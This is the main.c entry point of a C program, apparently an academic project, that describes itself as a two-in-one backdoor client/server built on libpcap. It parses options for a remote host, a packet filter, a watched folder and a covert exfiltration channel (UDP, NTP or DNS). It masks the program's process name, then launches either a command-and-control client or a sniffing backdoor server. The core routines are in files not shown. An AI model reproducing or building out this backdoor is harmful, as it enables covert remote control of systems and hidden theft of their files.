/*
SOURCE FILE: main.c

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: See the program help for usage instructions and the attached
  report for program design notes.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>

#include "server.h"
#include "client.h"
#include "defs.h"
#include "mask.h"
#include "util.h"
#include "inet.h"

int main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind, optopt;
	int c;
	int client = FALSE;
	int command_chan = CHAN_UDP;
	int exfil_chan = CHAN_UDP;
	char rmthost[MAX_LEN];
	char filter[MAX_LEN];
	char folder[MAX_LEN];
	int port = DEF_PRT;
	uint32 ipaddr;

	strncpy(rmthost, DEF_ADR, MAX_LEN);
	strncpy(filter, DEF_FLT, MAX_LEN);
	strncpy(folder, DEF_WCH, MAX_LEN);

	while ((c = getopt(argc, argv, ":csdhi:p:f:w:x:")) != -1)
	{
		switch(c) 
		{
			case 'c':
				client = TRUE;
				break;
			case 's':
				client = FALSE;
				break;
			case 'i':
				strncpy(rmthost, optarg, MAX_LEN); 
				break;
			case 'f':
				strncpy(filter, optarg, MAX_LEN);
				break;
			case 'w':
				strncpy(folder, optarg, MAX_LEN);
				break;
			case 'x':
				if (optarg[0] == 'u')
					exfil_chan = CHAN_UDP;
				else if (optarg[0] == 'n')
					exfil_chan = CHAN_NTP;
				else if (optarg[0] == 'd')
					exfil_chan = CHAN_DNS;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'h':
				usage(argv[0]);
				break;
			case ':': // Missing operand.
				fprintf(stderr, "-%c requires an operand.\n", optopt);
				usage(argv[0]);
				break;
			case '?': // Unrecognized option
				fprintf(stderr, "-%c is not a recognized option.\n", optopt);
				usage(argv[0]);
				break;
		}
	}

	// Mask the program
	maskprog(argv[0]);

	ipaddr = resolve(rmthost);

	if (client) // C&C Client
		backdoor_client(ipaddr, port, command_chan, exfil_chan); // Start command entry
	else // Backdoor Server
		pcap_start(filter, ipaddr, folder, command_chan, exfil_chan);
	
	return 0;
}

